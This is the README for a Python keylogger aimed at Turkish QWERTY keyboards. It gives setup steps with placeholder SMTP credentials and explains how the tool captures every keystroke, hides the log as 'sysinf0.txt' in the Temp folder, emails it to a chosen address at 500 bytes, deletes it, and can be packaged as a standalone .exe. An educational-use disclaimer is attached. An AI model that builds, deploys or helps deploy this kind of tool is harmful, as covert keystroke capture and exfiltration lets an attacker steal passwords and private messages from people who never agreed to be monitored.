\# Turkish_QWERTY_Keylogger

A simple keylogger written in Python, compatible with \*\*Turkish QWERTY
keyboards\*\*. It records keystrokes, stores them in a local file, and
sends their contents via email once the log file reaches a specific
size.

\> ⚠️ \*\*DISCLAIMER:\*\* This project is intended \*\*for educational
and self-testing purposes only\*\*. Monitoring computer activity without
explicit permission is illegal and unethical. The developer is not
responsible for any misuse of this software.

\-\--

\## 🚀 Installation

1\. \*\*Install dependency:\*\*

\`\`\`bash pip install pynput \`\`\`

2\. \*\*Enter your sender and receiver email credentials in the code
exactly as below:\*\*

\`\`\`python Structure\[\"From\"\] = \"EnterSenderMail@gmail.com\"
Structure\[\"To\"\] = \"EnterRecipientMail@gmail.com\"
server.login(\"EnterUsername\",\"EnterPassword\") \`\`\`

3\. \*(Optional)\* Convert to \`.exe\`:

\`\`\`bash pip install pyinstaller pyinstaller \--onefile keylogger.py
\`\`\`

\-\--

\## 📁 Log File Location

Keystrokes are saved to:

\`\`\` C:/Users/\<username\>/AppData/Local/Temp/sysinf0.txt \`\`\`

Once the file size reaches \*\*500 bytes\*\*, its contents are emailed
and the file is automatically deleted.

\-\--

\## ⚙️ How It Works

\- Every keystroke is captured via \`Listener\`. - Turkish Q keyboard
logic is handled using \*\*Shift\*\*, \*\*CapsLock\*\*, and
\*\*AltGr\*\* conversions. - After each batch of 10 characters, logs are
written to the file. - A background thread checks file size
periodically. - When the threshold is exceeded, the log file is emailed
via SMTP.

\-\--

\## 📌 Notes

\- For Gmail SMTP, you may need to enable \*\*\"Allow less secure
apps\"\*\* under your Google account. - Use only on \*\*your own device
for test/learning purposes.\*\* - All misuse is solely the user\'s
responsibility.

\-\--

\## 👨‍💻 Developer

Utku B.
